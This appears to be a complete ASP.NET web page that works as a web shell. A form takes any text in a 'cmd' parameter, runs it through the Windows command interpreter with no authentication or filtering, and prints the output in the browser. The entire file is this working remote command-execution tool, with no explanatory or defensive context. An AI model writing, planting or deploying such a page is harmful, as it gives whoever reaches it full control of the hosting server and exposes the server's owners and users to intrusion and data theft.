<%@ Page Language="C#" Debug="true" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<!DOCTYPE html>
<html>
<head>
    <title>Command Execution Page</title>
</head>
<body>
    <form method="get">
        <label for="cmd">Enter Command:</label>
        <input type="text" name="cmd" id="cmd" />
        <input type="submit" value="Execute" />
    </form>
    <hr />
    <h3>Command Output:</h3>
    <pre>
<%
    string cmd = Request.QueryString["cmd"];
    if (!String.IsNullOrEmpty(cmd))
    {
        try
        {
            ProcessStartInfo procStartInfo = new ProcessStartInfo("cmd", "/c " + cmd);
            procStartInfo.RedirectStandardOutput = true;
            procStartInfo.UseShellExecute = false;
            procStartInfo.CreateNoWindow = true;

            using (Process proc = new Process())
            {
                proc.StartInfo = procStartInfo;
                proc.Start();

                string result = proc.StandardOutput.ReadToEnd();
                Response.Write(Server.HtmlEncode(result));
            }
        }
        catch (Exception ex)
        {
            Response.Write("Error: " + Server.HtmlEncode(ex.Message));
        }
    }
%>
    </pre>
</body>
</html>
